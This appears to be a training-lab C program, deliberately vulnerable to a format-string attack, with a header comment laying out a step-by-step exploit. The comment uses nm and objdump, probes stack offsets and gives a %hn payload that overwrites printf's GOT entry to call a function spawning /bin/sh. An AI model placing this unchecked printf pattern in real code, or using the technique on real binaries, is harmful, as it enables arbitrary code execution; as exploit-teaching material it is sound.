/* Overwriting eip 
 * gcc -g -O0 -fno-stack-protector -Wno-format-security -z execstack -Wl,-z,norelro -o format3 format3.c
 * ./format4 $(printf "\x41\x41\x41\x41\x42\x42\x42\x42")%15\$p%16\$p
 * Exploit (multibyte):
 * ==============
 * 1. Find the address of the function to call: nm ./format3 -> 080484e1 T spawnShell
 * 2. Find the address in the got to overwrite: objdump -R ./format3 -> 080498f8 R_386_JUMP_SLOT   printf
 * 3. Find the format string on the stack: ./format3 $(printf "AAAABBBBCCCCDDDD")%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
 * 4. So the A's are 15, B's are 16, C's 17, D's are 18
 * 5. Double check the alignment ./format3 $(printf "AAAABBBBCCCCDDDD")%15\$p%16\$p%17\$p%18\$p
 * 6. Use short writes to overwrite the address:
	$(printf "\xfa\x98\x04\x08\xf8\x98\x04\x08")%2044x%15\$hn%31965x%16\$hn
	- So the %15 param writes the last half of the address (84e1), and %16 writes the first part of the address (0804)
 */
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void be_nice_to_people() {
    // /bin/sh is usually symlinked to bash, which usually drops privs. Make
    // sure we don't drop privs if we exec bash, (ie if we call system()).
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int exit_nicely(char *msg)
{
	printf("\n%s\n", msg);
	return(0);
}

int vulnerable_function(char *format)
{
    printf(format);
}

//__attribute__((destructor(2))) int spawnShell()
int spawnShell()
{
        printf("\nrunning sh...\n");
        system("/bin/sh");
	return(1);
}

int main(int argc, const char **argv) {
    be_nice_to_people();
    char buf[100];

    sleep(100);
  if(argc == 1) {
    errx(1, "please specify an argument\n");
  }

    memset(buf, '\0', sizeof(buf));
    memcpy(buf, argv[1], sizeof(buf)); 

    /* Call the vulnerable function */
    vulnerable_function(buf);

    /* Call the exit function */
    exit_nicely("Exiting..."); 
    return 0;
}
